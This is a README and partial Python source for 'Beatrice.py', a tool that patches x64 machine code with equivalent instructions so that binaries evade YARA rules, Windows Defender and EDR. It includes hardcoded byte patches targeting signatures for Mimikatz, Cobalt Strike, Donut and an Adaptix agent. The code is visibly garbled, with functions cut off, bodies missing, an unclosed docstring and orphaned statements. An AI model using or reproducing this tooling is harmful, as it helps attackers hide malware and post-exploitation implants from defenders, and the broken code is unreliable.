# Beatrice.py

To bypass detection methods like YARA rules that look for certain bytes and memory scanners Beatrice.py patches machine code in binaries with alternative x64 assembly opcodes of the same size. This tool was also designed to modify machine code of executables or complex binaries that contain strings and other data, it will strictly match machine code to avoid breaking binaries.

# What this tool does

### It will:

- Generate patterns of simple assembly x64 instructions and their alternative instructions, turn them into machine code and patch the machine code if it matches.
- Build different lists of assembly instructions that contain immediate values and other instructions that can’t be easily turned into patterns and apply appropriate changes to them.
- Apply alternative ways to encode instructions whenever possible.
- Create an identical binary functionality wise but with the above patches applied that will help evade YARA rules and some Antivirus solutions.

### It will NOT:

- Be a one size fits all solution.
- Modify strings, so detection is still possible based on strings.
- Modify imports or calls to Windows API functions that can be detected by some AVs and EDRs.
- Completely evade behavior based detection. While this modifies the machine code enough to sometimes trick behavior based detection it won’t change the core functionality leading to still possibilities for detection.

While this tool can make some binaries evade AVs on its own, it is best used combined with other evasion techniques (Examples: Modify shellcode to be used with a loader, help with custom or modified tooling)

# Tests against Windows Defender and Elastic YARA rules ( April 2026 )

        return True

        if mnem.startswith("mov") and "xmm" in op_lower:

            mnem.startswith("add") or
            mnem.startswith("sub")

        return True
    return False

class TrieNode:
    __slots__ = ("children", "value")

    def __init__(self):
        self.children = {}   # byte -> TrieNode
        self.value = None    # replacement bytes (if terminal)


def build_trie(patches):
    root = TrieNode()

    for old, new in patches:
        node = root
        for b in old:  # iterates as ints (0–255)
            node = node.children.setdefault(b, TrieNode())
        node.value = new

    return root


def patch_binary(data: bytes, patches):
    root = build_trie(patches)

    output = bytearray(data)
    n = len(output)

    verbose = "-v" in sys.argv
    total = 0

    i = 0
    while i < n:
        node = root
        j = i
        last_match = None  # (end_index, replacement)

        # Walk forward in trie
        while j < n:
            node = node.children.get(output[j])
            if node is None:
                break

            j += 1

            if node.value is not None:
                last_match = (j, node.value)

        if last_match:
            end, replacement = last_match
            old = output[i:end]

            output[i:end] = replacement

            if verbose:
                print(f"[+] Patch at offset 0x{i:x}: {bytes(old).hex()} -> {replacement.hex()}")
            elif total % 100 == 0 and total > 0:
                print(f"[+] {total} patches applied")

            total += 1
            i = end  # skip past match
        else:
            i += 1

    return bytes(output), total

def encode(instr):
    """
    Optimized instruction encoder using Keystone with caching.
    Returns bytes or None if invalid.
    """
    if instr in _encode_cache:
        return _encode_cache[instr]

    try:
        encoding, _ = ks.asm(instr)
        if not encoding:
            return None
        result = bytes(encoding)
        _encode_cache[instr] = result
        return result
    except Exception:
        return None



def compile_pattern(pattern, key_order):
    compiled = []
    i = 0
    while i < len(pattern):
        if pattern[i] == '{':
            j = pattern.find('}', i)
            var_name = pattern[i+1:j]
            idx = key_order[var_name]
            compiled.append((VAR, idx))
            i = j + 1
        else:
            j = i
            while j < len(pattern) and pattern[j] != '{':
                j += 1
            compiled.append((LIT, pattern[i:j]))
            i = j
    return compiled

def get_keys(p1, p2):
    keys = ["a"]

        keys.append("c")
    if "{d}" in p1 or "{d}" in p2:

def generate_patch_string(compiled1, compiled2, combo):
    """
    combo: tuple of register names as strings
    Returns two instruction strings

    instr1_pieces = [v if t == LIT else combo[v] for t, v in compiled1]
    instr2_pieces = [v if t == LIT else combo[v] for t, v in compiled2]
    instr1 = "".join(instr1_pieces)
    instr2 = "".join(instr2_pieces)

def make_rex(w, r, x, b):
    """Construct REX prefix (or return b'' if not needed)."""
    rex = 0x40
    if w: rex |= 0x08  # 64-bit operand
    if r: rex |= 0x04
    if x: rex |= 0x02
    if b: rex |= 0x01
    return bytes([rex]) if rex != 0x40 else b''
    
ALT_ENCODINGS = []

for dst_i in range(16):
    for src_i in range(16):
        dst_lo = dst_i & 0b111
        src_lo = src_i & 0b111

        rex_r = (dst_i >> 3) & 1
        rex_b = (src_i >> 3) & 1

        # mov r64, r/m64 (8B)
        modrm_8b = 0xC0 | (dst_lo << 3) | src_lo

def chunked(iterable, size):
    chunk = []
    for item in iterable:
        chunk.append(item)
        if len(chunk) == size:
            yield chunk
            chunk = []
    if chunk:
        yield chunk


def generate_patches(regs, patterns, altencoding=False, chunk_size=200000):
   

    # Ensure regs are strings
    regs_str = [r if isinstance(r, str) else r.decode() for r in regs]

    tasks = []

    for p1, p2 in patterns:
        keys = get_keys(p1, p2)
        key_order = {k: i for i, k in enumerate(keys)}
        n = len(keys)

        compiled1 = compile_pattern(p1, key_order)
        compiled2 = compile_pattern(p2, key_order)

        perms = itertools.permutations(regs_str, n)

        for chunk in chunked(perms, chunk_size):
            combos = [tuple(c) for c in chunk]
            tasks.append((compiled1, compiled2, combos))

    with ProcessPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for res in executor.map(patches_chunk, tasks, itertools.repeat(altencoding)):
            patches.extend(res)

    return patches
                
def minusconverter(val):
    """
    Convert a signed value string (like "-0x20") into 64-bit two's complement integer.
    Returns as hex string: 0xffffffffffffffe0
    """
    # Convert string to int, auto-detect hex or decimal
    val_int = int(val, 0)  # 0 base lets Python handle 0x prefix automatically

    if val_int < 0:
        val_int = (1 << 64) + val_int  # 64-bit two's complement

    return f"0x{val_int:016X}"

            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
                patches.append((enc1, enc2))
                continue
        
        for b in xorcomplex:
            split = b.split(";")
            xorop = split[0]
            if "xor" in split[1]:
                xorop = split[1]
            reg = xorop[4:xorop.index(",")].strip()
            subop = b.replace(f"xor {reg}, {reg}",f"sub {reg}, {reg}")
            enc1 = encode(b)
            enc2 = encode(subop)
            if not enc2:
                continue
            
            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
                patches.append((enc1, enc2))

        # shift places of instructions like mov dl,BYTE PTR [rbx+rax*1+0x1] to mov dl,BYTE PTR [rax+rbx*1+0xf0] resulting in different encoding
        for b in movshift:
            
            bracket = mem_pattern.findall(b)
            reg = reg_pattern.findall(" ".join(bracket))
            shift = b.replace(f"{reg[0]} + {reg[1]}",f"{reg[1]} + {reg[0]}")
            enc1 = encode(b)
            enc2 = encode(shift)
    
            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
                patches.append((enc1, enc2))
                
       
        for b in movx:
            alt = b.replace("zx","sx")
            enc1 = encode(b)
            enc2 = encode(alt)
            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
                patches.append((enc1, enc2))
          
        #rewrite instructions like mov rdx, qword ptr [rbp - 0x10]; add rdx, rcx into mov rdx, rcx; add rdx, qword ptr [rbp - 0x10]
              
        for b in movadd:
            instr = b.split(";")
            half1 = instr[0][4:]
            half2 = instr[1][4:]
            enc1 = encode(b)
            enc2 = encode(f"mov {half2}; add {half1}")
            
            if enc1 and enc2 and len(enc1) == len(enc2) and len(enc1) > 3:
                patches.append((enc1, enc2))
                
        
        # patterns + most common instructions that cant be easily put into patterns (m)
                
        complexpatterns = []
        
        for m in complexops:             
            complexpatterns.extend([
            (f"test {{a}},{{a}}; {m}", f"or {{a}},{{a}}; {m}"),
            (f"{m}; add {{a}},{{a}}", f"{m}; shl {{a}}, 1"),
            ])
            
        generate_patches(allreg, complexpatterns)
    
    
    #manual patches, feel free to add super specific patches
    
    patches.extend([
    
        #donut
        (b"\x33\xC0\xEB\x08", b"\x29\xC0\xEB\x08"),
        (b"\x74\x14\x33\xD2", b"\x74\x14\x29\xD2"),

        #cobaltstrike
        (b"\x48\x89\xC2\x83\xE2\x03", b"\x50\x5A\x90\x83\xE2\x03"),
        
        #adaptix agent.x64.bin
        (b"\x0F\xB6\x55\x12\x88\x10",b"\x0F\xBE\x55\x12\x88\x10"),
        
        #mimikatz
        (b"\x01\x00\x00\xC0\x48\x85\xC9", b"\x01\x00\x00\xC0\x48\x09\xC9"),
        (b"\x24\x02\x0F\x84\x00\x00", b"\x24\x02\x0F\x84\x00\x01"),
        (b"\x05\x02\x0F\x0D\x09", b"\x2D\xFE\xF0\xF2\xF6"),
        (b"\x24\x43\x72\x64\x41\x48\xFF\x15", b"\x24\x43\x72\x64\x41\x48\x00\x15"),
        (b"\xF3\x0F\x6F\x6C\x24\x30", b"\xC5\xFA\x6F\x6C\x24\x30"),
        (b"\x48\x8B\xCA\xF3", b"\x48\x89\xD1\xF3"),
    ])
    
    patched, total = patch_binary(data, patches)
    ftotal = total

    with open(filename, "wb") as f:
        f.write(patched)
    
    patches.clear()
    
    with open(filename, "rb") as f:
        data = f.read()
        
    altencoding_patterns = [
        ("mov {a},{b}", "mov {a},{b}"),
        ("xor {a},{a}", "xor {a},{a}"),
        ("push {a}; pop {b}", "push {a}; pop {b}"),
        ("div {a}", "div {a}"),
        ("inc {a}", "inc {a}")
    ]

    generate_patches(allreg, altencoding_patterns, altencoding=True)
    print("[+] Applying alternative encoding")

    patched, total = patch_binary(data, patches)
    
    if total == 0:
        l2 = [(y, x) for (x, y) in ALT_ENCODINGS]
        ALT_ENCODINGS.clear()
        ALT_ENCODINGS.extend(l2)
        generate_patches(allreg, altencoding_patterns, altencoding=True)
        patched, total = patch_binary(data, patches)
    ftotal = ftotal + total
    print(f"[+] Total applied patches: {ftotal}")

        f.write(patched)
    
    print("[+] Done.")
